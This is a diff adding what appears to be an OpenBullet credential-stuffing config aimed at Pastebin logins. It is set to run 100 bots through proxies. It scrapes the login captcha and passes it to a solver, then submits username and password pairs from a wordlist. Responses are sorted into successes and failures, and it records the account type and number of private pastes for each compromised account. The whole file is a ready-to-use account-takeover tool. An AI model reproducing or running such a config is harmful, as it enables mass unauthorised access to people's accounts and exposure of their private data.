@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "PastebinCaptchaSolve",
+  "SuggestedBots": 100,
+  "LastModified": "2018-08-08T09:55:53.4225887+00:00",
+  "AdditionalInfo": "",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://pastebin.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "etc/captcha/random.php?p=" "\"" Recursive=FALSE -> VAR "NUMB" "" "" 
+CAPTCHA "https://pastebin.com/etc/captcha/random.php?p=<NUMB>" Base64=FALSE SendScreenshot=FALSE -> VAR "CAP" 
+REQUEST POST "https://pastebin.com/login" AutoRedirect=TRUE 
+  CONTENT "submit_hidden=submit_hidden&user_name=<USER>&user_password=<PASS>&captcha_solution=<CAP>&submit=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "The captcha test failed" 
+    KEY "There was an error with your login details" 
+  KEYCHAIN Success OR 
+    KEY "Change Password" 
+PARSE "<SOURCE>" LR "header_user_status\">" "<" Recursive=FALSE -> CAP "Type" "" "" 
+PARSE "<SOURCE>" LR "Number of private pastes: " "<" Recursive=FALSE -> CAP "Private Pastes" "" "" 
